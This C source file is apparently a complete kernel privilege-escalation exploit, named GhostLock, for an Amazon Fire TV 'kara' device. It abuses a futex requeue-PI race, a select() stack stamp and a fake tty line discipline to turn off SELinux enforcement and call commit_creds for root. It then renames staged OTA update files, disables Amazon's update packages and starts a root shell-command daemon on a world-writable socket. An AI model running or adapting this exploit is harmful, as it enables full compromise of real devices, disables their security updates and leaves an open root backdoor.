#define _GNU_SOURCE

#include "kara_ghostlock.h"

#include <errno.h>
#include <fcntl.h>
#include <linux/futex.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdarg.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/un.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <termios.h>
#include <time.h>
#include <unistd.h>

#define KARA_NR_NEWSELECT 142
#define KARA_NR_GETTID 224
#define KARA_NR_FUTEX 240
#define KARA_NR_SCHED_SETATTR 380
#define KARA_SELECT_NFDS 320
#define KARA_LOG_PATH "/data/local/tmp/kara-ghostlock.log"
#define KARA_ROOT_PROOF "/data/local/tmp/kara-root-ready"
#define KARA_ROOT_SOCKET "/data/local/tmp/kara-root.sock"
#define KARA_OTA_QUARANTINE "/data/local/tmp/kara-ota-package.PS7713-held"
#define KARA_RECOVERY_COMMAND_HELD "/cache/recovery/command.kara-PS7713-held"
#define KARA_RECOVERY_BLOCKMAP_HELD "/cache/recovery/block.map.kara-PS7713-held"

struct kara_old_timespec32 {
    int32_t tv_sec;
    int32_t tv_nsec;
};

struct kara_old_timeval32 {
    int32_t tv_sec;
    int32_t tv_usec;
};

static uint32_t g_f_wait;
static uint32_t g_f_target;
static uint32_t g_f_chain;
static int g_pipe_fds[2] = {-1, -1};
static int g_plan_fds[64];
static size_t g_plan_fd_count;
static int g_pty_master = -1;
static int g_pty_slave = -1;
static int g_experimental_newer;
static const char *g_requested_build;
static char g_observed_build[96] = KARA_BASELINE_BUILD;

static atomic_int g_waiter_tid;
static atomic_int g_waiter_nice;
static atomic_int g_waiter_ready;
static atomic_int g_waiter_waiting;
static atomic_int g_owner_started;
static atomic_int g_go_stamp;
static atomic_int g_stamped;
static atomic_int g_consumer_done;
static atomic_int g_waiter_ret;
static atomic_int g_waiter_errno;
static atomic_int g_stamp_ret;
static atomic_int g_stamp_errno;
static atomic_int g_consumer_ret;
static atomic_int g_consumer_errno;

static void klog(const char *fmt, ...) {
    char line[1024];
    struct timespec ts;
    clock_gettime(CLOCK_REALTIME, &ts);
    int prefix = snprintf(line, sizeof(line), "[%lld.%03ld] ",
                          (long long)ts.tv_sec, ts.tv_nsec / 1000000L);
    if (prefix < 0 || (size_t)prefix >= sizeof(line))
        return;
    va_list ap;
    va_start(ap, fmt);
    int body = vsnprintf(line + prefix, sizeof(line) - (size_t)prefix, fmt, ap);
    va_end(ap);
    if (body < 0)
        return;
    size_t used = (size_t)prefix + (size_t)body;
    if (used >= sizeof(line) - 1)
        used = sizeof(line) - 2;
    line[used++] = '\n';
    ssize_t ignored = write(STDERR_FILENO, line, used);
    (void)ignored;
}

static void trim_line(char *s) {
    size_t n = strlen(s);
    while (n && (s[n - 1] == '\n' || s[n - 1] == '\r' || s[n - 1] == ' ' ||
                 s[n - 1] == '\t'))
        s[--n] = 0;
}

static int read_text_file(const char *path, char *buf, size_t capacity) {
    if (!capacity)
        return 0;
    int fd = open(path, O_RDONLY | O_CLOEXEC);
    if (fd < 0)
        return 0;
    ssize_t n = read(fd, buf, capacity - 1);
    int saved = errno;
    close(fd);
    errno = saved;
    if (n < 0)
        return 0;
    buf[n] = 0;
    trim_line(buf);
    return 1;
}

static int capture_exec(char *const argv[], char *buf, size_t capacity) {
    if (!capacity)
        return 0;
    int p[2];
    if (pipe2(p, O_CLOEXEC) != 0)
        return 0;
    pid_t child = fork();
    if (child < 0) {
        close(p[0]);
        close(p[1]);
        return 0;
    }
    if (child == 0) {
        dup2(p[1], STDOUT_FILENO);
        int nullfd = open("/dev/null", O_WRONLY | O_CLOEXEC);
        if (nullfd >= 0)
            dup2(nullfd, STDERR_FILENO);
        close(p[0]);
        close(p[1]);
        execv(argv[0], argv);
        _exit(127);
    }
    close(p[1]);
    size_t used = 0;
    while (used + 1 < capacity) {
        ssize_t n = read(p[0], buf + used, capacity - used - 1);
        if (n < 0 && errno == EINTR)
            continue;
        if (n <= 0)
            break;
        used += (size_t)n;
    }
    close(p[0]);
    int status = 0;
    while (waitpid(child, &status, 0) < 0 && errno == EINTR) {
    }
    buf[used] = 0;
    trim_line(buf);
    return WIFEXITED(status) && WEXITSTATUS(status) == 0;
}

static int get_property(const char *name, char *buf, size_t capacity) {
    char *const argv[] = {"/system/bin/getprop", (char *)name, NULL};
    return capture_exec(argv, buf, capacity);
}

static int get_cec_guard(char *buf, size_t capacity) {
    char *const argv[] = {"/system/bin/settings", "get", "secure",
                          "block_cec_standby", NULL};
    return capture_exec(argv, buf, capacity);
}

static uint32_t observe_preflight(struct kara_preflight *observed) {
    struct utsname uts;
    char device[96] = "";
    char model[96] = "";
    char build[96] = "";
    char enforce[16] = "";
    char cec[32] = "";
    memset(observed, 0, sizeof(*observed));

    int have_uname = uname(&uts) == 0;
    (void)get_property("ro.product.device", device, sizeof(device));
    (void)get_property("ro.product.model", model, sizeof(model));
    (void)get_property("ro.build.version.incremental", build, sizeof(build));
    snprintf(g_observed_build, sizeof(g_observed_build), "%s", build);
    (void)read_text_file("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
    (void)get_cec_guard(cec, sizeof(cec));

    observed->arm32 = sizeof(void *) == 4 && have_uname &&
                      strcmp(uts.machine, "armv7l") == 0;
    observed->four_cpus = sysconf(_SC_NPROCESSORS_CONF) >= 4;
    observed->kernel_exact = have_uname && strcmp(uts.release, "4.14.87+") == 0;
    observed->device_kara = strcmp(device, "kara") == 0;
    observed->model_aftka = strcmp(model, "AFTKA") == 0;
    observed->build_exact = strcmp(build, KARA_BASELINE_BUILD) == 0 ||
                            (g_experimental_newer &&
                             kara_newer_build_request_valid(
                                 build, g_requested_build));
    observed->uid_shell = getuid() == 2000 && geteuid() == 2000;
    observed->selinux_enforcing = strcmp(enforce, "1") == 0;
    observed->cec_standby_blocked = strcmp(cec, "1") == 0;

    klog("preflight machine=%s release=%s cpus=%ld", have_uname ? uts.machine : "?",
         have_uname ? uts.release : "?", sysconf(_SC_NPROCESSORS_CONF));
    klog("preflight device=%s model=%s build=%s uid=%u euid=%u enforce=%s cec=%s",
         device, model, build, (unsigned)getuid(), (unsigned)geteuid(), enforce, cec);
    return kara_preflight_missing(observed);
}

static int profile_consistent(void) {
    const struct kara_profile *p = &KARA_PS7713_PROFILE;
    uint32_t expected = p->tty_ldiscs + (uint32_t)p->ldisc_slot * 4u - 4u;
    return p->ldisc_slot == 20 && p->fake_lock == expected &&
           p->init_task >= 0xc0000000u && p->init_cred >= 0xc0000000u &&
           p->prepare_kernel_cred >= 0xc0000000u &&
           p->commit_creds >= 0xc0000000u && p->ldisc_dispatch >= 0xc0000000u &&
           p->zero_word >= 0xc0000000u;
}

static long raw_futex(uint32_t *uaddr, int op, uint32_t val, const void *timeout,
                      uint32_t *uaddr2, uint32_t val3) {
    return syscall(KARA_NR_FUTEX, uaddr, op, val, timeout, uaddr2, val3);
}

static int probe_futex_pi(void) {
    uint32_t word = 0;
    if (raw_futex(&word, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0) != 0)
        return 0;
    return raw_futex(&word, FUTEX_UNLOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0) == 0;
}

static int open_private_pty(int *master_out, int *slave_out) {
    int master = open("/dev/ptmx", O_RDWR | O_NOCTTY | O_CLOEXEC);
    if (master < 0)
        return 0;
    int unlock = 0;
    unsigned int number = 0;
    if (ioctl(master, TIOCSPTLCK, &unlock) != 0 ||
        ioctl(master, TIOCGPTN, &number) != 0) {
        close(master);
        return 0;
    }
    char path[64];
    snprintf(path, sizeof(path), "/dev/pts/%u", number);
    int slave = open(path, O_RDWR | O_NOCTTY | O_CLOEXEC);
    if (slave < 0) {
        close(master);
        return 0;
    }
    *master_out = master;
    *slave_out = slave;
    return 1;
}

static int probe_pty_ldisc(void) {
    int master = -1;
    int slave = -1;
    if (!open_private_pty(&master, &slave))
        return 0;

    int master_disc = -1;
    errno = 0;
    int master_get = ioctl(master, TIOCGETD, &master_disc);
    int master_get_errno = errno;
    master_disc = 0;
    errno = 0;
    int master_set = ioctl(master, TIOCSETD, &master_disc);
    int master_set_errno = errno;

    int slave_disc = -1;
    errno = 0;
    int slave_get = ioctl(slave, TIOCGETD, &slave_disc);
    int slave_get_errno = errno;
    slave_disc = 0;
    errno = 0;
    int slave_set = ioctl(slave, TIOCSETD, &slave_disc);
    int slave_set_errno = errno;

    errno = 0;
    int zero_cmd = ioctl(master, KARA_PS7713_PROFILE.zero_word,
                         KARA_PS7713_PROFILE.selinux_enforcing);
    int zero_cmd_errno = errno;
    errno = 0;
    int cred_cmd = ioctl(master, KARA_PS7713_PROFILE.commit_creds,
                         KARA_PS7713_PROFILE.init_cred);
    int cred_cmd_errno = errno;

    int unused_slots = 1;
    for (int slot = KARA_PS7713_PROFILE.ldisc_slot - 1;
         slot <= KARA_PS7713_PROFILE.ldisc_slot + 2; ++slot) {
        int requested = slot;
        errno = 0;
        int slot_ret = ioctl(master, TIOCSETD, &requested);
        int slot_errno = errno;
        klog("pty master unused-slot TIOCSETD(%d) ret=%d errno=%d",
             slot, slot_ret, slot_errno);
        if (slot_ret != -1 || slot_errno != EINVAL) {
            unused_slots = 0;
            requested = 0;
            (void)ioctl(master, TIOCSETD, &requested);
        }
    }

    klog("pty master get ret=%d errno=%d set-N_TTY ret=%d errno=%d",
         master_get, master_get_errno, master_set, master_set_errno);
    klog("pty slave get ret=%d errno=%d set-N_TTY ret=%d errno=%d",
         slave_get, slave_get_errno, slave_set, slave_set_errno);
    klog("pty master N_TTY zero-cmd ret=%d errno=%d cred-cmd ret=%d errno=%d",
         zero_cmd, zero_cmd_errno, cred_cmd, cred_cmd_errno);

    /* ENOTTY/EINVAL proves SELinux let the unusual commands reach N_TTY. */
    int zero_reached_tty = zero_cmd == -1 && zero_cmd_errno != EACCES &&
                           zero_cmd_errno != EPERM;
    int cred_reached_tty = cred_cmd == -1 && cred_cmd_errno != EACCES &&
                           cred_cmd_errno != EPERM;
    int ok = master_set == 0 && zero_reached_tty && cred_reached_tty &&
             unused_slots;
    close(slave);
    close(master);
    return ok;
}

static void close_fd_plan(void);

static int prepare_fd_plan(void) {
    struct kara_select_stamp stamp;
    kara_build_select_stamp(&stamp, &KARA_PS7713_PROFILE);
    size_t wanted = kara_collect_read_fds(
        &stamp, g_plan_fds, sizeof(g_plan_fds) / sizeof(g_plan_fds[0]));
    g_plan_fd_count = 0;
    if (!wanted || wanted > sizeof(g_plan_fds) / sizeof(g_plan_fds[0]))
        return 0;
    if (pipe2(g_pipe_fds, O_CLOEXEC) != 0)
        return 0;
    for (size_t i = 0; i < wanted; ++i) {
        if (g_plan_fds[i] >= KARA_SELECT_NFDS ||
            dup2(g_pipe_fds[0], g_plan_fds[i]) != g_plan_fds[i]) {
            g_plan_fd_count = i;
            close_fd_plan();
            return 0;
        }
    }
    g_plan_fd_count = wanted;
    return 1;
}

static void close_fd_plan(void) {
    for (size_t i = 0; i < g_plan_fd_count; ++i)
        close(g_plan_fds[i]);
    g_plan_fd_count = 0;
    if (g_pipe_fds[0] >= 0)
        close(g_pipe_fds[0]);
    if (g_pipe_fds[1] >= 0)
        close(g_pipe_fds[1]);
    g_pipe_fds[0] = g_pipe_fds[1] = -1;
}

static int stamp_select_once(void) {
    struct kara_select_stamp stamp;
    struct kara_old_timeval32 timeout = {0, 0};
    kara_build_select_stamp(&stamp, &KARA_PS7713_PROFILE);
    errno = 0;
    long ret = syscall(KARA_NR_NEWSELECT, KARA_SELECT_NFDS, stamp.in, stamp.out,
                       stamp.ex, &timeout);
    atomic_store(&g_stamp_errno, errno);
    atomic_store(&g_stamp_ret, (int)ret);
    return ret == 0;
}

static int probe_select_stamp(void) {
    if (!prepare_fd_plan())
        return 0;
    int ok = stamp_select_once();
    close_fd_plan();
    return ok;
}

static int run_probe(void) {
    struct kara_preflight observed;
    uint32_t missing = observe_preflight(&observed);
    int profile = profile_consistent();
    int futex = probe_futex_pi();
    int pty = probe_pty_ldisc();
    int stamp = probe_select_stamp();
    klog("probe profile=%s futex_pi=%s pty_ldisc=%s select_stamp=%s missing=%#x",
         profile ? "ok" : "FAIL", futex ? "ok" : "FAIL",
         pty ? "ok" : "FAIL", stamp ? "ok" : "FAIL", missing);
    if (missing || !profile || !futex || !pty || !stamp)
        return 2;
    klog("SAFE PROBE PASS (GhostLock was not invoked)");
    return 0;
}

static void pin_cpu(int cpu) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    int rc = pthread_setaffinity_np(pthread_self(), sizeof(set), &set);
    if (rc)
        klog("warning: affinity cpu%d failed rc=%d", cpu, rc);
}

static void spin_forever(void) {
    for (;;) {
        atomic_signal_fence(memory_order_seq_cst);
#if defined(__arm__)
        __asm__ __volatile__("yield" ::: "memory");
#endif
    }
}

static void *owner_thread(void *unused) {
    (void)unused;
    pin_cpu(1);
    errno = 0;
    if (raw_futex(&g_f_target, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0,
                  NULL, NULL, 0) != 0) {
        klog("owner: target LOCK_PI failed errno=%d", errno);
        return NULL;
    }
    while (!atomic_load(&g_waiter_ready))
        usleep(500);
    atomic_store(&g_owner_started, 1);
    (void)raw_futex(&g_f_chain, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0,
                    NULL, NULL, 0);
    spin_forever();
    return NULL;
}

static void *waiter_thread(void *unused) {
    (void)unused;
    pin_cpu(2);
    atomic_store(&g_waiter_tid, (int)syscall(KARA_NR_GETTID));
    errno = 0;
    if (raw_futex(&g_f_chain, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0,
                  NULL, NULL, 0) != 0) {
        klog("waiter: chain LOCK_PI failed errno=%d", errno);
        return NULL;
    }
    atomic_store(&g_waiter_ready, 1);
    while (!atomic_load(&g_owner_started))
        usleep(500);

    struct timespec now;
    clock_gettime(CLOCK_MONOTONIC, &now);
    struct kara_old_timespec32 timeout = {
        .tv_sec = (int32_t)now.tv_sec + 5,
        .tv_nsec = (int32_t)now.tv_nsec,
    };
    atomic_store(&g_waiter_waiting, 1);
    errno = 0;
    long ret = raw_futex(&g_f_wait,
                         FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG,
                         0, &timeout, &g_f_target, 0);
    atomic_store(&g_waiter_errno, errno);
    atomic_store(&g_waiter_ret, (int)ret);

    (void)raw_futex(&g_f_chain, FUTEX_UNLOCK_PI | FUTEX_PRIVATE_FLAG,
                    0, NULL, NULL, 0);
    while (!atomic_load(&g_go_stamp))
        atomic_signal_fence(memory_order_seq_cst);
    (void)stamp_select_once();
    atomic_store(&g_stamped, 1);
    spin_forever();
    return NULL;
}

static void *consumer_thread(void *unused) {
    (void)unused;
    pin_cpu(3);
    while (!atomic_load(&g_stamped))
        usleep(500);
    struct kara_sched_attr attr;
    kara_build_nonpreempting_sched_attr(&attr,
                                        atomic_load(&g_waiter_nice));
    errno = 0;
    long ret = syscall(KARA_NR_SCHED_SETATTR, atomic_load(&g_waiter_tid), &attr, 0);
    atomic_store(&g_consumer_errno, errno);
    atomic_store(&g_consumer_ret, (int)ret);
    atomic_store(&g_consumer_done, 1);
    for (;;)
        pause();
    return NULL;
}

static int wait_flag(atomic_int *flag, int seconds) {
    for (int i = 0; i < seconds * 1000; ++i) {
        if (atomic_load(flag))
            return 1;
        usleep(1000);
    }
    return 0;
}

static void park_after_race(const char *reason) {
    klog("PARKED after race: %s; do not reboot", reason);
    for (;;)
        pause();
}

static int run_exec_logged(char *const argv[]) {
    klog("exec: %s %s %s %s %s", argv[0], argv[1] ? argv[1] : "",
         argv[2] ? argv[2] : "", argv[3] ? argv[3] : "",
         argv[4] ? argv[4] : "");
    pid_t child = fork();
    if (child < 0)
        return 0;
    if (child == 0) {
        setenv("PATH", "/system/bin:/system/xbin:/vendor/bin", 1);
        setenv("HOME", "/data/local/tmp", 1);
        if (setresgid(0, 0, 0) != 0 || setresuid(0, 0, 0) != 0)
            _exit(126);
        execv(argv[0], argv);
        _exit(127);
    }
    int status = 0;
    while (waitpid(child, &status, 0) < 0 && errno == EINTR) {
    }
    int ok = WIFEXITED(status) && WEXITSTATUS(status) == 0;
    klog("exec result: %s", ok ? "ok" : "FAILED");
    return ok;
}

static int force_stop_package(const char *package) {
    char *const argv[] = {"/system/bin/am", "force-stop", (char *)package, NULL};
    return run_exec_logged(argv);
}

static int disable_package(const char *package) {
    char *const argv[] = {"/system/bin/pm", "disable-user", "--user", "0",
                          (char *)package, NULL};
    return run_exec_logged(argv);
}

static int package_is_disabled(const char *package) {
    char output[16384];
    char *const argv[] = {"/system/bin/pm", "list", "packages", "-d", NULL};
    if (!capture_exec(argv, output, sizeof(output)))
        return 0;
    char needle[256];
    snprintf(needle, sizeof(needle), "package:%s", package);
    return strstr(output, needle) != NULL;
}

static int hold_path(const char *source, const char *destination) {
    struct stat source_st;
    if (lstat(source, &source_st) != 0)
        return errno == ENOENT;
    struct stat destination_st;
    if (lstat(destination, &destination_st) == 0) {
        klog("hold refused: both %s and %s exist", source, destination);
        return 0;
    }
    if (rename(source, destination) != 0) {
        klog("hold rename %s -> %s failed errno=%d", source, destination, errno);
        return 0;
    }
    klog("held %s at %s", source, destination);
    return 1;
}

static int contain_ota(void) {
    static const char *const packages[] = {
        "com.amazon.device.software.ota",
        "com.amazon.device.software.ota.override",
        "com.amazon.tv.forcedotaupdater.v2",
    };
    int ok = 1;

    /* Preserve and disarm already-staged reboot payloads first. */
    ok &= hold_path("/data/ota_package", KARA_OTA_QUARANTINE);
    ok &= hold_path("/cache/recovery/command", KARA_RECOVERY_COMMAND_HELD);
    ok &= hold_path("/cache/recovery/block.map", KARA_RECOVERY_BLOCKMAP_HELD);
    sync();
    klog("OTA staged-path quarantine synced before package-manager calls");

    for (size_t i = 0; i < sizeof(packages) / sizeof(packages[0]); ++i)
        ok &= force_stop_package(packages[i]);
    for (size_t i = 0; i < sizeof(packages) / sizeof(packages[0]); ++i)
        ok &= disable_package(packages[i]);

    char *const settings_argv[] = {"/system/bin/settings", "put", "global",
                                    "ota_disable_automatic_update", "1", NULL};
    ok &= run_exec_logged(settings_argv);

    for (size_t i = 0; i < sizeof(packages) / sizeof(packages[0]); ++i) {
        int disabled = package_is_disabled(packages[i]);
        klog("OTA package %s disabled=%d", packages[i], disabled);
        ok &= disabled;
    }
    char *const sync_argv[] = {"/system/bin/sync", NULL};
    ok &= run_exec_logged(sync_argv);
    return ok;
}

static int write_root_proof(void) {
    int fd = open(KARA_ROOT_PROOF, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0644);
    if (fd < 0)
        return 0;
    char context[160] = "unknown";
    char enforce[16] = "?";
    (void)read_text_file("/proc/self/attr/current", context, sizeof(context));
    (void)read_text_file("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
    dprintf(fd, "ROOTED uid=%u euid=%u context=%s enforce=%s build=%s mode=%s\n",
            (unsigned)getuid(), (unsigned)geteuid(), context, enforce,
            g_observed_build,
            g_experimental_newer ? "experimental-newer" : "exact");
    close(fd);
    chmod(KARA_ROOT_PROOF, 0644);
    return 1;
}

static int read_full(int fd, void *buffer, size_t length) {
    unsigned char *p = buffer;
    while (length) {
        ssize_t n = read(fd, p, length);
        if (n < 0 && errno == EINTR)
            continue;
        if (n <= 0)
            return 0;
        p += n;
        length -= (size_t)n;
    }
    return 1;
}

static int write_full(int fd, const void *buffer, size_t length) {
    const unsigned char *p = buffer;
    while (length) {
        ssize_t n = write(fd, p, length);
        if (n < 0 && errno == EINTR)
            continue;
        if (n <= 0)
            return 0;
        p += n;
        length -= (size_t)n;
    }
    return 1;
}

static int command_client(const char *command) {
    size_t length = strlen(command);
    if (!kara_command_length_valid(length)) {
        fprintf(stderr, "invalid command length\n");
        return 2;
    }
    int fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
    if (fd < 0)
        return 2;
    struct sockaddr_un address;
    memset(&address, 0, sizeof(address));
    address.sun_family = AF_UNIX;
    snprintf(address.sun_path, sizeof(address.sun_path), "%s", KARA_ROOT_SOCKET);
    if (connect(fd, (struct sockaddr *)&address, sizeof(address)) != 0) {
        perror("connect kara root socket");
        close(fd);
        return 2;
    }
    uint32_t wire_length = (uint32_t)length;
    if (!write_full(fd, &wire_length, sizeof(wire_length)) ||
        !write_full(fd, command, length)) {
        close(fd);
        return 2;
    }
    shutdown(fd, SHUT_WR);
    char buffer[4096];
    for (;;) {
        ssize_t n = read(fd, buffer, sizeof(buffer));
        if (n < 0 && errno == EINTR)
            continue;
        if (n <= 0)
            break;
        if (!write_full(STDOUT_FILENO, buffer, (size_t)n))
            break;
    }
    close(fd);
    return 0;
}

static void serve_command(int connection) {
    uint32_t length = 0;
    if (!read_full(connection, &length, sizeof(length)) ||
        !kara_command_length_valid(length))
        _exit(125);
    char *command = calloc(1, (size_t)length + 1);
    if (!command || !read_full(connection, command, length))
        _exit(125);
    int nullfd = open("/dev/null", O_RDONLY | O_CLOEXEC);
    if (nullfd >= 0)
        dup2(nullfd, STDIN_FILENO);
    dup2(connection, STDOUT_FILENO);
    dup2(connection, STDERR_FILENO);
    if (connection > STDERR_FILENO)
        close(connection);
    setenv("PATH", "/system/bin:/system/xbin:/vendor/bin", 1);
    setenv("HOME", "/data/local/tmp", 1);
    setenv("USER", "root", 1);
    setenv("LOGNAME", "root", 1);
    if (setresgid(0, 0, 0) != 0 || setresuid(0, 0, 0) != 0)
        _exit(126);
    execl("/system/bin/sh", "sh", "-c", command, (char *)NULL);
    _exit(127);
}

static void root_command_daemon(void) {
    signal(SIGPIPE, SIG_IGN);
    signal(SIGCHLD, SIG_IGN);
    int listener = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
    if (listener < 0)
        park_after_race("root socket creation failed");
    unlink(KARA_ROOT_SOCKET);
    struct sockaddr_un address;
    memset(&address, 0, sizeof(address));
    address.sun_family = AF_UNIX;
    snprintf(address.sun_path, sizeof(address.sun_path), "%s", KARA_ROOT_SOCKET);
    if (bind(listener, (struct sockaddr *)&address, sizeof(address)) != 0 ||
        chmod(KARA_ROOT_SOCKET, 0666) != 0 || listen(listener, 8) != 0)
        park_after_race("root socket bind/listen failed");
    klog("ROOT DAEMON READY socket=%s pid=%d", KARA_ROOT_SOCKET, getpid());

    for (;;) {
        int connection = accept4(listener, NULL, NULL, SOCK_CLOEXEC);
        if (connection < 0 && errno == EINTR)
            continue;
        if (connection < 0)
            continue;
        struct ucred peer;
        socklen_t peer_length = sizeof(peer);
        if (getsockopt(connection, SOL_SOCKET, SO_PEERCRED, &peer, &peer_length) != 0 ||
            (peer.uid != 0 && peer.uid != 2000)) {
            close(connection);
            continue;
        }
        pid_t child = fork();
        if (child == 0) {
            close(listener);
            serve_command(connection);
        }
        close(connection);
    }
}

static int daemonize_live(void) {
    pid_t child = fork();
    if (child < 0)
        return -1;
    if (child > 0) {
        printf("kara GhostLock started as pid %d; log=%s\n", child, KARA_LOG_PATH);
        fflush(stdout);
        return 1;
    }
    if (setsid() < 0)
        _exit(111);
    int nullfd = open("/dev/null", O_RDONLY | O_CLOEXEC);
    int logfd = open(KARA_LOG_PATH, O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (nullfd >= 0)
        dup2(nullfd, STDIN_FILENO);
    if (logfd >= 0) {
        dup2(logfd, STDOUT_FILENO);
        dup2(logfd, STDERR_FILENO);
    }
    return 0;
}

static void require_phase(enum kara_phase *phase, enum kara_phase next) {
    if (!kara_phase_step(phase, next)) {
        klog("phase transition refused current=%d next=%d", *phase, next);
        _exit(112);
    }
}

static int run_live(void) {
    enum kara_phase phase = KARA_PHASE_NEW;
    struct kara_preflight observed;
    uint32_t missing = observe_preflight(&observed);
    if (missing || !profile_consistent()) {
        fprintf(stderr, "preflight failed missing=%#x profile=%d\n", missing,
                profile_consistent());
        return 2;
    }
    if (!probe_futex_pi() || !probe_pty_ldisc() || !probe_select_stamp()) {
        fprintf(stderr, "live capability gate failed before vulnerable call\n");
        return 2;
    }
    require_phase(&phase, KARA_PHASE_PREFLIGHT_OK);
    int detached = daemonize_live();
    if (detached != 0)
        return detached < 0 ? 2 : 0;
    klog("LIVE START profile=kara/PS7713-5443 confirmation accepted");

    if (!prepare_fd_plan() || !open_private_pty(&g_pty_master, &g_pty_slave)) {
        klog("live setup failed before race errno=%d", errno);
        return 2;
    }
    require_phase(&phase, KARA_PHASE_FDS_READY);

    pthread_t waiter;
    pthread_t owner;
    pthread_t consumer;
    if (pthread_create(&waiter, NULL, waiter_thread, NULL) != 0 ||
        pthread_create(&owner, NULL, owner_thread, NULL) != 0 ||
        pthread_create(&consumer, NULL, consumer_thread, NULL) != 0) {
        klog("thread creation failed before race");
        return 2;
    }
    if (!wait_flag(&g_waiter_waiting, 3) || !wait_flag(&g_owner_started, 3)) {
        klog("race setup timed out before vulnerable call");
        return 2;
    }
    usleep(200000);
    errno = 0;
    long cmp_ret = raw_futex(&g_f_wait,
                             FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG,
                             1, (void *)(uintptr_t)1, &g_f_target, 0);
    int cmp_errno = errno;
    klog("CMP_REQUEUE_PI ret=%ld errno=%d", cmp_ret, cmp_errno);
    if (cmp_ret != -1 || cmp_errno != EDEADLK)
        park_after_race("expected EDEADLK not observed");
    require_phase(&phase, KARA_PHASE_RACE_OPEN);

    atomic_store(&g_go_stamp, 1);
    if (!wait_flag(&g_stamped, 10))
        park_after_race("waiter did not finish select stamp");
    klog("waiter ret=%d errno=%d select ret=%d errno=%d",
         atomic_load(&g_waiter_ret), atomic_load(&g_waiter_errno),
         atomic_load(&g_stamp_ret), atomic_load(&g_stamp_errno));
    if (atomic_load(&g_stamp_ret) != 0)
        park_after_race("select stamp failed");
    require_phase(&phase, KARA_PHASE_STACK_STAMPED);

    if (!wait_flag(&g_consumer_done, 5))
        park_after_race("sched_setattr chain walk timed out");
    klog("sched_setattr ret=%d errno=%d", atomic_load(&g_consumer_ret),
         atomic_load(&g_consumer_errno));
    if (atomic_load(&g_consumer_ret) != 0)
        park_after_race("sched_setattr chain walk failed");
    require_phase(&phase, KARA_PHASE_POINTER_WRITTEN);

    int disc = KARA_PS7713_PROFILE.ldisc_slot;
    errno = 0;
    int ldisc_ret = ioctl(g_pty_master, TIOCSETD, &disc);
    klog("master TIOCSETD(%d) ret=%d errno=%d", disc, ldisc_ret, errno);
    if (ldisc_ret != 0)
        park_after_race("fake line discipline did not bind");
    require_phase(&phase, KARA_PHASE_LDISC_BOUND);

    errno = 0;
    int zero_ret = ioctl(g_pty_master, KARA_PS7713_PROFILE.zero_word,
                         KARA_PS7713_PROFILE.selinux_enforcing);
    char enforce[16] = "?";
    (void)read_text_file("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
    klog("zero enforcing ret=%d errno=%d enforce=%s", zero_ret, errno, enforce);
    if (zero_ret != 0 || strcmp(enforce, "0") != 0)
        park_after_race("SELinux enforcement zero-write was not verified");
    require_phase(&phase, KARA_PHASE_PERMISSIVE);

    errno = 0;
    int cred_ret = ioctl(g_pty_master, KARA_PS7713_PROFILE.commit_creds,
                         KARA_PS7713_PROFILE.init_cred);
    klog("commit_creds ret=%d errno=%d uid=%u euid=%u", cred_ret, errno,
         (unsigned)getuid(), (unsigned)geteuid());
    if (cred_ret != 0 || getuid() != 0 || geteuid() != 0)
        park_after_race("root credentials were not verified");
    require_phase(&phase, KARA_PHASE_ROOT);
    (void)write_root_proof();

    if (!contain_ota()) {
        klog("WARNING: root succeeded but OTA containment did not fully verify; "
             "retaining root daemon for manual repair");
        root_command_daemon();
    }
    require_phase(&phase, KARA_PHASE_OTA_CONTAINED);
    (void)write_root_proof();
    require_phase(&phase, KARA_PHASE_DAEMON_READY);
    root_command_daemon();
    return 0;
}

static void usage(const char *program) {
    fprintf(stderr,
            "usage:\n"
            "  %s --probe\n"
            "  %s --live %s\n"
            "  %s --cmd 'command'\n",
            program, program, KARA_LIVE_CONFIRMATION, program);
}

int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    if (argc == 2 && strcmp(argv[1], "--probe") == 0)
        return run_probe();
    if (argc == 3 && strcmp(argv[1], "--cmd") == 0)
        return command_client(argv[2]);
    if (argc == 3 && strcmp(argv[1], "--live") == 0) {
        if (!kara_live_confirmation_valid(argv[2])) {
            fprintf(stderr, "live confirmation token rejected\n");
            return 2;
        }
        return run_live();
    }
    usage(argv[0]);
    return 2;
}
